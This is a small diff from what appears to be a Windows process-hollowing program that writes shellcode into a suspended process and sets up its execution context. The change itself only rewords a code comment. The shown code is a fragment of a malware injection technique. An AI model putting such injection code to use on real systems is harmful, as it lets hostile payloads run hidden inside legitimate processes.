@@ -29,7 +29,7 @@ int _tmain(int argc, _TCHAR* argv[])
         bSuccess = WriteProcessMemory(pi.hProcess, pImageBase, shellcode, dwImageSize, &dwBytesWritten);
         if (bSuccess && dwBytesWritten == dwImageSize) // If the shellcode has been written and the size of it is equal to the allocated memory
         {
-            // We get the address of the shellcode in the hollowed process
+            // We create a pointer to get the address of the shellcode in the hollowed process
             pEntryPoint = (LPVOID)((DWORD)pImageBase);
             // We also get the context of the suspended process
             ctx.ContextFlags = CONTEXT_FULL;
